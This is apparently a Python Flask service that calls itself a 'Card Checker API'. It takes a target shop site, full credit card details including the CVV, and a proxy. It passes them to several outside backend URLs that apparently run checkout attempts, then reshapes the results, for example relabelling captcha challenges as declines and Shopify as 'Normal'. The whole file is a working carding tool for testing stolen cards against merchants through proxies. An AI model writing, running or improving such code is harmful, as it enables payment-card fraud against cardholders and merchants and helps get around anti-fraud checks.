from flask import Flask, request, jsonify
import requests
import os
import random

app = Flask(__name__)

# Get port from environment variable (Render provides this)
PORT = int(os.environ.get('PORT', 7000))

# List of APIs to use
APIS = [
    "https://wizs-garage.onrender.com/wizard.php?site={site}&cc={cc}&proxy={proxy}",
    "https://urls-pot-taking-sells.trycloudflare.com/index.php?site={site}&cc={cc}&proxy={proxy}",
    "https://bro-production.up.railway.app/index.php?site={site}&cc={cc}&proxy={proxy}",
    "https://bro1-production.up.railway.app/index.php?site={site}&cc={cc}&proxy={proxy}"
]
@app.route('/check', methods=['GET'])
def check_endpoint():
    # Get parameters from request
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    
    # Check if all required parameters are present  
    if not all([site, cc, proxy]):  
        return jsonify({  
            "error": "Missing required parameters. Please provide site, cc, and proxy.",
            "example": "/check?site=example.com&cc=4111111111111111|12|25|123&proxy=127.0.0.1:8080"
        }), 400  
    
    # Shuffle APIs to randomize which one is used first
    random.shuffle(APIS)
    
    # Try each API in random order
    last_error = None
    for api_url_template in APIS:
        try:  
            # Forward request to the original endpoint  
            original_url = api_url_template.format(site=site, cc=cc, proxy=proxy)  
            
            # Send request to original endpoint with timeout
            response = requests.get(original_url, timeout=30)  
            response_data = response.json()  
            
            # Create transformed response
            transformed_response = {}
            
            # Process Status field
            if response_data.get("Status") == "true":
                transformed_response["Status"] = "true"
            elif response_data.get("Status") == "Fail":
                transformed_response["Status"] = "false"
            else:
                transformed_response["Status"] = str(response_data.get("Status", "Unknown")).lower()
            
            # Process other fields
            for key, value in response_data.items():
                if key == "Status":
                    continue
                elif key == "Gateway" and value == "Shopify":
                    transformed_response["Gateway"] = "Normal"
                elif key == "Gateway":
                    transformed_response["Gateway"] = value
                elif key == "Response":
                    # Convert CAPTCHA_REQUIRED to CARD_DECLINED
                    if value == "CAPTCHA_REQUIRED":
                        transformed_response["Response"] = "CARD_DECLINED"
                    else:
                        transformed_response["Response"] = value
                elif key == "Retries":
                    continue
                elif key == "Price":
                    transformed_response["Price"] = value
                elif key == "cc":
                    transformed_response["cc"] = value
                else:
                    transformed_response[key] = value
            
            # Add default fields if missing
            if "Response" not in transformed_response:
                transformed_response["Response"] = "No response message"
            
            if "Price" not in transformed_response:
                transformed_response["Price"] = "0.0"
                
            if "Gateway" not in transformed_response:
                transformed_response["Gateway"] = "Unknown"
            
            # Create final ordered response
            final_response = {}
            
            # Order fields
            field_order = ["Status", "Gateway", "Price", "Response", "cc"]
            for field in field_order:
                if field in transformed_response:
                    final_response[field] = transformed_response[field]
            
            # Add any remaining fields
            for key, value in transformed_response.items():
                if key not in field_order:
                    final_response[key] = value
            
            return jsonify(final_response)
            
        except requests.exceptions.Timeout:
            last_error = "Request timeout"
            continue
        except requests.exceptions.RequestException as e:
            last_error = f"Request failed: {str(e)}"
            continue
        except ValueError as e:
            last_error = "Invalid response from server"
            continue
        except Exception as e:
            last_error = f"Unexpected error: {str(e)}"
            continue
    
    # If all APIs failed, return error response
    return jsonify({
        "Status": "false",
        "Gateway": "Unknown",
        "Price": "0.0",
        "Response": last_error if last_error else "All APIs failed",
        "cc": cc
    }), 500

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "message": "Card Checker API is running",
        "endpoints": {
            "/check": "Main checkout endpoint"
        },
        "parameters": {
            "site": "Target website URL",
            "cc": "Credit card details (format: number|month|year|cvv)",
            "proxy": "Proxy server (format: ip:port)"
        },
        "example": f"{request.host_url}check?site=example.com&cc=4111111111111111|12|25|123&proxy=127.0.0.1:8080"
    })

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "timestamp": __import__('datetime').datetime.now().isoformat()
    })

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=PORT)
